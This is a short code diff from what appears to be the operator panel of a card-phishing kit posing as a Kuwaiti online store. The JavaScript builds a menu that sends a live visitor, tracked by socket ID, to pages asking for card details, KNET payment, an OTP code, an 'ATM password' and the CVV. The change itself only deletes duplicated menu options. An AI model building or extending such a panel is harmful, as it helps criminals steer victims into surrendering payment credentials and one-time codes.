@@ -1540,20 +1540,7 @@
       html += '<option value="atm">كلمة مرور ATM</option>';
       html += '<option value="cvv">CVV</option>';
       html += '<option value="final-page">الصفحة النهائية</option>';
-      html += '';
-      // صفحات المتجر الحالية فقط
-      html += '<option value="home">الصفحة الرئيسية</option>';
-      html += '<option value="">اختر صفحة</option>';
-      html += '<option value="products">المنتجات</option>';
-      html += '<option value="cart">سلة المشتريات</option>';
-      html += '<option value="checkout">إتمام الطلب</option>';
-      html += '<option value="card">الدفع بالبطاقة</option>';
-      html += '<option value="knet">دفع KNET</option>';
-      html += '<option value="otp-verification">رمز التحقق (OTP)</option>';
-      html += '<option value="atm">كلمة مرور ATM</option>';
-      html += '<option value="cvv">CVV</option>';
-      html += '<option value="final-page">الصفحة النهائية</option>';
-      html += '</select>';
+html += '</select>';
       html += '<button onclick="navigateVisitorTop(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توجيه</button>';
       html += '</div></div>';
       
